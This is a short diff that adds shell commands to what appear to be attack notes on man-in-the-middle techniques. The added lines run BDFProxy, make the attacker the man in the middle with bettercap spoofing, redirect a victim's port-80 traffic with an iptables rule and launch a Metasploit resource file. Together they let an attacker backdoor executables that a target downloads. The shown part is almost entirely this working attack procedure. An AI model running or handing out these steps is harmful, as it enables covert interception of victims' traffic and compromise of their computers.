@@ -147,7 +147,22 @@ dns.spoof on
 * Another method for downloading backdoors is using a software called BDFProxy:
 
 ```shell
+#Navigate to /opt/BDFProxy, and configure bdfproxy.cfg according to target
 
+cd /opt/BDFProxy/
+
+./bdf_proxy.py
+
+#Now, become the MITM
+bettercap -iface eth0 -caplet spoof.cap
+
+#Apply a rule for packets
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+#run resource file given by BDFProxy
+msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
+
+#Now, we can wait for target computer to download something like an .exe file, so that it can get backdoored during the process
 ```
 
 ---
